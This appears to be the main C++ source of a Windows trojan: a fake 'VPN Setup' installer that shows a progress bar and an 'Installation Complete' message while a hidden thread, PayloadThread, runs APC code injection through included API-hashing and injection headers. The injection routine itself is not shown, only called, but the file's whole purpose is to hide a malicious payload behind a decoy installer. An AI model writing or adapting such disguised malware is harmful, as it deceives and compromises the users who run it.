#ifndef UNICODE
#define UNICODE
#endif 

#include <windows.h>
#include <commctrl.h>
#include <process.h>
#include <iostream>

#include "../include/api_hashing.h"
#include "../include/injection.h"
#include "../include/resource.h"

#pragma comment(lib, "comctl32.lib")

#define IDC_PROGRESS 101
#define IDT_TIMER1 102

bool g_isInjectionFinished = false;

unsigned int __stdcall PayloadThread(void* data) {
    RunAPC();     
    g_isInjectionFinished = true;
    return 0;
}


// winapi dokümantasyonundan buldum pencere açmak falan
// bikaç bişi değiştirdim
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
    // Initialize common controls
    INITCOMMONCONTROLSEX icex;
    icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
    icex.dwICC = ICC_PROGRESS_CLASS;
    InitCommonControlsEx(&icex);

    // Register the window class.
    const wchar_t CLASS_NAME[]  = L"VPN Setup";
    
    WNDCLASS wc = { };

    wc.lpfnWndProc   = WindowProc;
    wc.hInstance     = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1));

    RegisterClass(&wc);

    // to center the window
    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);
    int winW = 400;
    int winH = 150;

    // Create the window.

    HWND hwnd = CreateWindowEx(
        0,                              // Optional window styles.
        CLASS_NAME,                     // Window class
        L"Installing the VPN...",       // Window text
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU, // Window style

        // Size and position
        CW_USEDEFAULT, CW_USEDEFAULT, 400, 150,

        NULL,       // Parent window    
        NULL,       // Menu
        hInstance,  // Instance handle
        NULL        // Additional application data
        );

    if (hwnd == NULL)
    {
        return 0;
    }

    ShowWindow(hwnd, nCmdShow);

    // Run the message loop.

    MSG msg = { };
    while (GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    static HWND hwndPB;
    static int progress = 0;

    switch (uMsg)
    {
    case WM_CREATE:
        {
            // Create static text label
            CreateWindowW(L"STATIC", L"Installing the VPN...",
                WS_CHILD | WS_VISIBLE | SS_LEFT,
                20, 20, 360, 20,
                hwnd, NULL, NULL, NULL);

            // Create progress bar
            hwndPB = CreateWindowEx(0, PROGRESS_CLASS, NULL,
                WS_CHILD | WS_VISIBLE,
                20, 50, 350, 20,
                hwnd, (HMENU)IDC_PROGRESS, NULL, NULL);

            // Set the timer to update the progress bar
            SetTimer(hwnd, IDT_TIMER1, 50, NULL);

            _beginthreadex(NULL, 0, PayloadThread, NULL, 0, NULL);
        }
        return 0;

    case WM_TIMER:
        {
            if(progress < 90){
                progress++;
            }
            else if(progress >= 90 && g_isInjectionFinished){
                progress = 100;
            }

            SendMessage(hwndPB, PBM_SETPOS, progress, 0);

            if (progress >= 100)
            {
                KillTimer(hwnd, IDT_TIMER1);
                MessageBox(hwnd, L"Installation Complete.",L"Success", MB_OK | MB_ICONINFORMATION);
                PostQuitMessage(0);
            }
        }
        return 0;

    case WM_DESTROY:
        KillTimer(hwnd, IDT_TIMER1);
        PostQuitMessage(0);
        return 0;

    case WM_PAINT:
        {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);

            // All painting occurs here, between BeginPaint and EndPaint.

            FillRect(hdc, &ps.rcPaint, (HBRUSH) (COLOR_WINDOW+1));

            EndPaint(hwnd, &ps);
        }
        return 0;

    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}